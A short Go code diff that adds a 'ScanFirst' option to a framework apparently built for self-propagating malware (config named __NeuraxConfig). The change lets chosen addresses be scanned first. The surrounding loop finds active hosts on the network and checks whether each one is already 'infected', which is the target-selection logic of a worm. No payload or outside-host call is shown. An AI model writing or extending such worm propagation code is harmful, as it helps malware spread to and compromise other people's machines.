@@ -81,6 +81,7 @@ type __NeuraxConfig struct {
 	ScanTimeout     int
 	ScanAll         bool
 	ScanFast        bool
+	ScanFirst       []string
 	ReadArpCache    bool
 	Threads         int
 	FullRange       bool
@@ -112,6 +113,7 @@ var NeuraxConfig = __NeuraxConfig{
 	ScanTimeout:     2,
 	ScanAll:         false,
 	ScanFast:        false,
+	ScanFirst:       []string{},
 	ReadArpCache:    false,
 	Threads:         10,
 	FullRange:       false,
@@ -459,6 +461,9 @@ func neurax_scan_active(c chan string) {
 		targets = append(targets, addr)
 	}
 	targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
+	if len(NeuraxConfig.ScanFirst) != 0 {
+		targets = append(NeuraxConfig.ScanFirst, targets...)
+	}
 	for _, target := range targets {
 		fmt.Println("Scanning ", target)
 		if IsHostActive(target) && !IsHostInfected(target) {
